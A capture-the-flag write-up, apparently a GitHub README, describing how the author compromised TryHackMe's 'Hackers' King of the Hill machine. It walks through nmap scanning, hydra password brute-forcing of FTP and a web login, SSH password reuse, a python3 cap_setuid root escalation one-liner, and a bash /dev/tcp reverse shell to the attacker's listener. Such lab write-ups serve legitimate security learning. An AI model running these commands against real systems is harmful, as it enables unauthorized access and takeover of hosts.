# THM-KoTH-Hackers 👾🤖
Writeup for the "Hackers" king of the hill boot2root machine on tryhackme 

```ruby
                                          
                                        
 $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\  
$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ 
$$ /  $$ |$$ /  $$ |$$ /  $$ |$$ /  $$ |
$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |
$$$$$$$  |\$$$$$$  |\$$$$$$$ |\$$$$$$$ |
$$  ____/  \______/  \____$$ | \____$$ |
$$ |                $$\   $$ |$$\   $$ |
$$ |                \$$$$$$  |\$$$$$$  |
\__|                 \______/  \______/ 
```

- fire up nmap
```bash
──(root㉿kali)-[~]
└─# nmap -sC -sV 10.10.167.61        
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-20 22:42 UTC
Nmap scan report for ip-10-10-167-61.eu-west-1.compute.internal (10.10.167.61)
Host is up (0.0075s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.149.220
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           400 Apr 29  2020 note
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ffeab0583579dfb3c157014309be2ad5 (RSA)
|   256 3bff4a884fdc0331b69bddea6985b0af (ECDSA)
|_  256 fafd4c0a03b6f71ceef83343dcb47541 (ED25519)
80/tcp   open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Ellingson Mineral Company
9999/tcp open  abyss?

```
- ftp anon open
- instantly try it ( guessed the password was root lol 💀💀💀 )
```bash
┌──(root㉿kali)-[~]
└─# ftp 10.10.167.61 21
Connected to 10.10.167.61.
220-Ellingson Mineral Company FTP Server
220-
220-WARNING
220-Unauthorised Access is a felony offense under the Computer Fraud and Abuse Act 1986
220 
Name (10.10.167.61:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
```
ls and u get a note, but ls -la and u get a hidden file flag ( took it as a hint for l8r flag hunting )
```bash
ftp> ls
229 Entering Extended Passive Mode (|||27107|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           400 Apr 29  2020 note
226 Directory send OK.
ftp> get note
local: note remote: note
229 Entering Extended Passive Mode (|||25107|)
150 Opening BINARY mode data connection for note (400 bytes).
100% |**************************|   400      100.70 KiB/s    00:00 ETA
226 Transfer complete.
400 bytes received in 00:00 (58.38 KiB/s)
ftp> ls -la
229 Entering Extended Passive Mode (|||55228|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Apr 30  2020 .
drwxr-xr-x    2 ftp      ftp          4096 Apr 30  2020 ..
-rw-r--r--    1 ftp      ftp            38 Apr 30  2020 .flag
-rw-r--r--    1 ftp      ftp           400 Apr 29  2020 note
226 Directory send OK.
ftp> get .flag
local: .flag remote: .flag
229 Entering Extended Passive Mode (|||38904|)
150 Opening BINARY mode data connection for .flag (38 bytes).
100% |**************************|    38       77.47 KiB/s    00:00 ETA
226 Transfer complete.
38 bytes received in 00:00 (37.90 KiB/s)
ftp> exit
221 Goodbye.
```
- note gave us 2 users *rcampbell* and *gcrawford** ( hydra time )
- opened 2 terminal tabs and plopped one hydra ftp force for each user
```bash
┌──(root㉿kali)-[~]
└─# hydra -l rcampbell -P /usr/share/wordlists/rockyou.txt 10.10.167.61 ftp
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-20 22:54:07
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.167.61:21/
[STATUS] 304.00 tries/min, 304 tries in 00:01h, 14344095 to do in 786:25h, 16 active

[21][ftp] host: 10.10.167.61   login: rcampbell   password: s[REDACTED]y
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-20 22:56:54

┌──(root㉿kali)-[~]
└─# hydra -l gcrawford -P /usr/share/wordlists/rockyou.txt 10.10.167.61 ftp       
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-20 22:48:28
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.167.61:21/
[STATUS] 304.00 tries/min, 304 tries in 00:01h, 14344095 to do in 786:25h, 16 active
[21][ftp] host: 10.10.167.61   login: gcrawford   password: b[REDACTED]6
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-20 23:15:24
```

- the hydra for gcrawford was taking way too long and turned out i didnt need it in the end.
- logged into ftp as campbell and got another flag
```bash
┌──(root㉿kali)-[~]
└─# ftp 10.10.167.61 21          
Connected to 10.10.167.61.
220-Ellingson Mineral Company FTP Server
220-
220-WARNING
220-Unauthorised Access is a felony offense under the Computer Fraud and Abuse Act 1986
220 
Name (10.10.167.61:root): rcampbell
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||39239|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls
229 Entering Extended Passive Mode (|||61160|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||44255|)
150 Here comes the directory listing.
drwxr-x---    2 ftp      ftp          4096 Apr 30  2020 .
drwxr-x---    2 ftp      ftp          4096 Apr 30  2020 ..
lrwxrwxrwx    1 ftp      ftp             9 Apr 30  2020 .bash_history -> /dev/null
-rw-r--r--    1 ftp      ftp           220 Apr 29  2020 .bash_logout
-rw-r--r--    1 ftp      ftp          3771 Apr 29  2020 .bashrc
-r--------    1 ftp      ftp            38 Apr 30  2020 .flag
-rw-r--r--    1 ftp      ftp           807 Apr 29  2020 .profile
226 Directory send OK.
ftp> get .flag
local: .flag remote: .flag
229 Entering Extended Passive Mode (|||11093|)
150 Opening BINARY mode data connection for .flag (38 bytes).
100% |**************************|    38       50.48 KiB/s    00:00 ETA
226 Transfer complete.
38 bytes received in 00:00 (21.10 KiB/s)
ftp> exit
221 Goodbye.
```
- since there was two users provided and 3 ssh accounts open i figured theres 1 root and the 2 we found so i tried the same password for ssh and it worked.
```bash
┌──(root㉿kali)-[~]
└─# ssh rcampbell@10.10.167.61
The authenticity of host '10.10.167.61 (10.10.167.61)' can't be established.
ED25519 key fingerprint is SHA256:h5AEIGHsr8ICezAIclTEDV4ACuGkC/SeSi9Gb2Rik1g.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.167.61' (ED25519) to the list of known hosts.
Unauthorised access is a federal offense under the Computer Fraud and Abuse Act 1986
rcampbell@10.10.167.61's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

rcampbell@gibson:~$ ls

```
- check for SUID's, /etc/sudoers, etc. nothing, but getcaps gives us this:
```bash
/usr/bin/python3.6 = cap_setuid+ep
/usr/bin/python3.6m = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```
- exploit:
```python
python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```
- and like that we got root now we hunt for flags and secure the king.txt
```bash
root@gibson:~# whoami
root
```
![](https://media.tenor.com/myX9wL2rQkEAAAAC/tower-of-god-tog.gif))
- regular flag and user .txt didnt find anything so i used the hint we gained earlier about the hidden files
```bash
root@gibson:/root# find / -name flag.txt 2>/dev/null
root@gibson:/root# find / -name user.txt 2>/dev/null
root@gibson:/root# find / -name .flag  2>/dev/null
/root/.flag
/home/tryhackme/.flag
/home/production/.flag
/home/rcampbell/.flag
/var/ftp/.flag
```
- the box said it had 9 flags and we only found 5 now so i tried *.txt as well and found bussiness.txt
```bash
/home/gcrawford/business.txt
```
- after traversing throught the system with no luck finding the flag i tried surfing the http website, trying exiftool on the pictures and going through the source code and dirbuster. I found http://10.10.167.61/backdoor/ and http://10.10.167.61/backdoor/shell/ pretty sus if you ask me. I tried loging in with the ftp and ssh user-pass combos first but it didnt work. The error kept giving me an annoying js alert popup. So i pulled up hydra again.

```bash
┌──(root㉿kali)-[~]
└─# hydra -l plague -P /usr/share/wordlists/rockyou.txt 10.10.167.61 http-post-form "/api/login:username=^USER^&password=^PASS^:Incorrect" -IV
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
[80][http-post-form] host: 10.10.167.61   login: plague   password: 1[REDACTED]0                                                                    
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-20 22:57:54

```
- there were multiple hints throughout the robots.txt and an html comment with a bolded **PLAGUE** so i tried it for the user.
- after i got in i ls and figure out its the /production directory we already pwned through ssh. Out of boredom i just did a thrash bash revshell with a nc listening on port 6969
- 
```bash
    
=============================
=    daPlague's backdoor    =
=     Skiddies Keep Out     =
=============================
plague@gibson:$ ls
resources
server
plague@gibson:$ bash -i >& /dev/tcp/10.10.149.220/6969 0>&1

```
-and we got a thrash revshell woohoo! we already pwned the box so i wasnt looking at pwning it from here ( i was lookking for flags ), but i checked for possible entries anyways in case i needed to patch something
```bash
production@gibson:~/webserver$ sudo abilities
sudo abilities
sudo: no tty present and no askpass program specified
production@gibson:~/webserver$ sudo -l
sudo -l
Matching Defaults entries for production on gibson:
    env_reset, pwfeedback, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User production may run the following commands on gibson:
    (root) NOPASSWD: /usr/bin/openssl
```
-so you can definetly pwn it through here exploiting openssl, but there was 15 minutes left and i already pwned it so i didnt bother ( this time )

# Conclusion
- this was a fun box i got 6/9 flags + firstblood and king pwn which is solid considering this was my first play on this machine. Just wish my hydra worked faster cause i feel like i got the more op accounts pass before the lower tier one that had ssh keys in his account.
- overall really fun machine. Personal rating 8/10 !!!
- il definetly play again and try to find the remaining 3 flags !

<img align="left" width="300px" height="250px" src="https://github.com/2alf/THM-KoTH-Hackers/assets/113948114/ee9bd116-d885-494e-a362-9cd1d972eb85" style="padding-right:10px;" />
<img align="left"  width="200px" height="250px" src="https://github.com/2alf/THM-KoTH-Hackers/assets/113948114/d75bf102-0c5a-4302-a0be-1da07b7bcf5d" style="padding-right:10px;" />

